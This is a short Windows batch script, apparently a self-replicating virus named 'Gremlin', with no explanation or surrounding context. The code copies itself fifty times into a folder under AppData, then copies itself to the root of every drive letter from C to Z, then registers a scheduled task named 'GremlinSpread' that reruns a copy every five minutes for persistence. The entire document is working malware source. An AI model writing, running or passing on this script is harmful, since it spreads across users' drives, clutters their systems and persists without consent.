@echo off
set"virus_name=Gremlin_%random%.bat"
set"target_dir=%appdata%\Gremlins"
set"count=0"

:check_dir
if not exist"%target_dir%" (
    mkdir"%target_dir%"
)

:replicate
copy"%~f0" "%target_dir%\%virus_name%"
set /a count+=1
if %count% LSS 50 (
    set"virus_name=Gremlin_%random%.bat"
    goto replicate)
:start_spread
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist"%%d:\" (
        copy"%~f0" "%%d:\%virus_name%"
    ))
:persist
schtasks /create /sc minute /mo 5 /tn"GremlinSpread" /tr"%target_dir%\%virus_name%" /f >nul 2>&1
goto :eof
